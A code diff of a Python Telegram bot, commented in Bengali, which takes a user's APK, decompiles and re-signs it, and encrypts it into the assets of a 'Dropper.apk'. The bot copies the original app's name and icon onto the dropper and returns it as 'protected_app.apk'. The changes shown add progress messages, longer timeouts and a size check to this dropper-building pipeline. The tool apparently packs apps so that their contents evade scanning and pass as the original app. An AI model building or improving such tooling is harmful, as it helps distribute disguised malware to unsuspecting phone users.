@@ -216,16 +216,19 @@ def process_encryption(apk_data: bytes, assets_dir: str):
 # ----- সাইন ফাংশন (ভেরিফিকেশন বাদ) -----
 async def sign_apk(apk_path, chat_id, context, keystore_path, password):
     cmd = f"apksigner sign --ks {keystore_path} --ks-pass pass:{password} --v1-signing-enabled true --v2-signing-enabled true --v3-signing-enabled true --v4-signing-enabled true {apk_path}"
-    proc = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=120)
+    proc = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=600)
     if proc.returncode != 0:
         await context.bot.send_message(chat_id, f"❌ Signing failed:\n{proc.stderr[:500]}")
         return False
     return True
 
 # ----- মেসেজ পাঠানোর হেল্পার -----
-async def send_progress(chat_id, text, context):
-    await context.bot.send_message(chat_id, text)
-    await asyncio.sleep(0.2)   # মিনিমাম ডেলি
+async def send_progress(chat_id, text, context, delay=0.2):
+    try:
+        await context.bot.send_message(chat_id, text)
+        await asyncio.sleep(delay)
+    except Exception:
+        pass  # সাইলেন্ট ইগনোর
 
 # ----- APK প্রসেসিং (দ্রুত, অ্যালাইনমেন্ট সহ) -----
 async def process_apk_file(update: Update, context: ContextTypes.DEFAULT_TYPE, apk_data: bytes):
@@ -240,11 +243,16 @@ async def process_apk_file(update: Update, context: ContextTypes.DEFAULT_TYPE, a
             f.write(apk_data)
 
         # ---- ১. ইউজার APK ডিকম্পাইল ----
+        await send_progress(chat_id, "📖 Decoding user APK...", context)
         decoded_user = os.path.join(work_dir, 'decoded_user')
-        proc = subprocess.run(f"apktool d -f -o {decoded_user} {input_apk}", shell=True, capture_output=True, text=True, timeout=120)
+        proc = subprocess.run(
+            f"apktool d -f -o {decoded_user} {input_apk}",
+            shell=True, capture_output=True, text=True, timeout=300
+        )
         if proc.returncode != 0:
             await context.bot.send_message(chat_id, f"❌ Decode user APK failed:\n{proc.stderr[:500]}")
             return
+        await send_progress(chat_id, "✅ User APK decoded.", context)
 
         # নাম বের করা
         app_name = "App"
@@ -262,6 +270,7 @@ async def process_apk_file(update: Update, context: ContextTypes.DEFAULT_TYPE, a
                 pass
 
         # প্যাকেজ নাম পরিবর্তন
+        await send_progress(chat_id, f"🔧 Changing package name to {TARGET_PACKAGE}...", context)
         manifest_path = os.path.join(decoded_user, 'AndroidManifest.xml')
         if os.path.exists(manifest_path):
             with open(manifest_path, 'r', encoding='utf-8') as f:
@@ -287,13 +296,19 @@ async def process_apk_file(update: Update, context: ContextTypes.DEFAULT_TYPE, a
                 f.write(content)
 
         # রিকম্পাইল ইউজার APK
+        await send_progress(chat_id, "🛠 Rebuilding user APK...", context)
         modified_apk = os.path.join(work_dir, 'modified_user.apk')
-        proc = subprocess.run(f"apktool b -o {modified_apk} {decoded_user}", shell=True, capture_output=True, text=True, timeout=120)
+        proc = subprocess.run(
+            f"apktool b -o {modified_apk} {decoded_user}",
+            shell=True, capture_output=True, text=True, timeout=300
+        )
         if proc.returncode != 0:
             await context.bot.send_message(chat_id, f"❌ Rebuild user APK failed:\n{proc.stderr[:500]}")
             return
+        await send_progress(chat_id, "✅ User APK rebuilt.", context)
 
         # সাইন ইউজার APK
+        await send_progress(chat_id, "🔑 Signing user APK...", context)
         keystore = os.path.join(os.getcwd(), 'signer', 'myKey.p12')
         if not os.path.exists(keystore):
             await context.bot.send_message(chat_id, "❌ Keystore not found!")
@@ -307,27 +322,36 @@ async def process_apk_file(update: Update, context: ContextTypes.DEFAULT_TYPE, a
 
         if not await sign_apk(modified_apk, chat_id, context, keystore, passwd):
             return
+        await send_progress(chat_id, "✅ User APK signed.", context)
 
         # এনক্রিপ্ট ইউজার APK
+        await send_progress(chat_id, "🔐 Encrypting user APK...", context)
         with open(modified_apk, 'rb') as f:
             modified_apk_data = f.read()
 
         # ---- ২. Dropper প্রসেসিং ----
+        await send_progress(chat_id, "📖 Decoding Dropper APK...", context)
         dropper_apk = os.path.join(os.getcwd(), 'Dropper.apk')
         if not os.path.exists(dropper_apk):
             await context.bot.send_message(chat_id, "❌ Dropper.apk not found!")
             return
         decoded_dropper = os.path.join(work_dir, 'decoded_dropper')
-        proc = subprocess.run(f"apktool d -f -o {decoded_dropper} {dropper_apk}", shell=True, capture_output=True, text=True, timeout=120)
+        proc = subprocess.run(
+            f"apktool d -f -o {decoded_dropper} {dropper_apk}",
+            shell=True, capture_output=True, text=True, timeout=300
+        )
         if proc.returncode != 0:
             await context.bot.send_message(chat_id, f"❌ Dropper decode failed:\n{proc.stderr[:500]}")
             return
+        await send_progress(chat_id, "✅ Dropper APK decoded.", context)
 
         # অ্যাসেট রিপ্লেস
+        await send_progress(chat_id, "📦 Replacing assets...", context)
         assets_dir = os.path.join(decoded_dropper, 'assets')
         process_encryption(modified_apk_data, assets_dir)
 
         # ইউজারের নাম ও আইকন কপি
+        await send_progress(chat_id, "🎨 Copying user icon/name...", context)
         res_user = os.path.join(decoded_user, 'res')
         res_dropper = os.path.join(decoded_dropper, 'res')
         if os.path.exists(res_user):
@@ -371,36 +395,59 @@ async def process_apk_file(update: Update, context: ContextTypes.DEFAULT_TYPE, a
                 f.write(content)
 
         # রিকম্পাইল Dropper
+        await send_progress(chat_id, "🛠 Rebuilding Dropper APK...", context)
         output_apk = os.path.join(work_dir, 'output.apk')
-        proc = subprocess.run(f"apktool b -o {output_apk} {decoded_dropper}", shell=True, capture_output=True, text=True, timeout=120)
+        proc = subprocess.run(
+            f"apktool b -o {output_apk} {decoded_dropper}",
+            shell=True, capture_output=True, text=True, timeout=300
+        )
         if proc.returncode != 0:
             await context.bot.send_message(chat_id, f"❌ Rebuild Dropper failed:\n{proc.stderr[:500]}")
             return
+        await send_progress(chat_id, "✅ Dropper APK rebuilt.", context)
 
         # ---- অ্যালাইনমেন্ট (zipalign) ----
+        await send_progress(chat_id, "📦 Aligning APK...", context)
         aligned_apk = os.path.join(work_dir, 'aligned.apk')
         try:
-            subprocess.run(f"zipalign -v -p 4 {output_apk} {aligned_apk}", shell=True, check=True, timeout=60)
+            subprocess.run(
+                f"zipalign -v -p 4 {output_apk} {aligned_apk}",
+                shell=True, check=True, timeout=120
+            )
         except Exception as e:
             await context.bot.send_message(chat_id, f"❌ Alignment failed: {str(e)}")
             return
+        await send_progress(chat_id, "✅ APK aligned.", context)
 
-        # সাইন Dropper (অ্যালাইনমেন্ট করা ফাইল)
+        # সাইন Dropper
+        await send_progress(chat_id, "🔑 Signing Dropper APK...", context)
         if not await sign_apk(aligned_apk, chat_id, context, keystore, passwd):
             return
+        await send_progress(chat_id, "✅ Dropper APK signed.", context)
 
         final_apk = aligned_apk
 
-        # ফাইল সাইজ চেক ও পাঠানো
+        # ---- ফাইল সাইজ চেক ----
         file_size = os.path.getsize(final_apk)
         file_size_mb = file_size / (1024 * 1024)
         if file_size_mb > 50:
-            await context.bot.send_message(chat_id, f"⚠️ APK size {file_size_mb:.1f} MB > 50 MB limit.")
-        await context.bot.send_message(chat_id, f"📦 Sending APK ({file_size_mb:.1f} MB)...")
+            await context.bot.send_message(
+                chat_id,
+                f"⚠️ APK size is {file_size_mb:.1f} MB, which exceeds Telegram's 50 MB limit.\n"
+                "Please use a smaller APK or compress it."
+            )
+            shutil.rmtree(work_dir)
+            return
 
+        await send_progress(chat_id, f"📦 Sending APK ({file_size_mb:.1f} MB)...", context)
+
+        # ---- পাঠানো ----
         try:
             with open(final_apk, 'rb') as f:
-                await context.bot.send_document(chat_id, f, filename="protected_app.apk")
+                await context.bot.send_document(
+                    chat_id, f, filename="protected_app.apk",
+                    read_timeout=600, write_timeout=600
+                )
             await context.bot.send_message(chat_id, "✅ Done! Your protected APK is ready.")
         except Exception as e:
             await context.bot.send_message(chat_id, f"❌ Send failed: {str(e)[:200]}")
@@ -410,7 +457,7 @@ async def process_apk_file(update: Update, context: ContextTypes.DEFAULT_TYPE, a
         logger.info(f"APK processing complete for user {user_id}")
 
     except subprocess.TimeoutExpired:
-        await context.bot.send_message(chat_id, "❌ Processing timed out. Try again.")
+        await context.bot.send_message(chat_id, "❌ Processing timed out. Try again with a smaller APK.")
         shutil.rmtree(work_dir, ignore_errors=True)
     except Exception as e:
         logger.error(f"Error: {e}")
